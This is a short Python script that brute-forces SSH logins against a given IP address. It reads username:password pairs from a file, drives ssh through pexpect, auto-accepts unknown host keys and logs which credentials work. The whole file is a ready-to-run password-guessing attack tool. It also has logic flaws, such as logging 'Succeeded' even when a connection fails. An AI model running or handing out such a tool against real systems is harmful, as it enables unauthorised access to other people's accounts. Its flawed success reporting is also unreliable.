import pexpect
import optparse
import sys
from misc import *

# add options 
parser = optparse.OptionParser()
parser.add_option('-i', dest='host', help="enter the target device's IP address")
parser.add_option('-f', dest="file_location", help="enter password file location")
(options, arg) = parser.parse_args()

prompt = ['#', '>>>', '>', '\$ ']

# TODO: use regex to check for IP validity
if options.host == "":
    log_error("You must provide a host IP address")
    sys.exit()
else:
    host = options.host

if options.file_location == "":
    log_error("You must provide a location to potential passwords")
    sys.exit()
else:
    file_location = options.file_location

# check if file exist
try:
    file = open(file_location, 'r')
except:
    log_error("File not found")

def ssh(host, username, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    ssh_connect_cmd = "ssh -v -oHostKeyAlgorithms=+ssh-rsa " + username + "@" + host
    child = pexpect.spawn(ssh_connect_cmd)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "password"])
    if ret == 0:
        log_error(f"Failed to connect to {host}")
        return
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "password"])
        if ret == 0:
            log_error(f"Failed to connect to {host}")
            return
    
    child.sendline(password)
    child.expect(prompt, timeout=0.5)
    return child

for line in file.readlines():
    try:
        username_pw_list = line.split(':')
        username = str(username_pw_list[0]).strip('\n')
        password = str(username_pw_list[1]).strip('\n')
        child = ssh(host, username, password)
        log_info(f"Succeeded: username: {username} Password: {password}")
    except:
        log_notice(f"Now attempting username: {username} password: {password}")
log_notice("All passwords provided has been attempted")


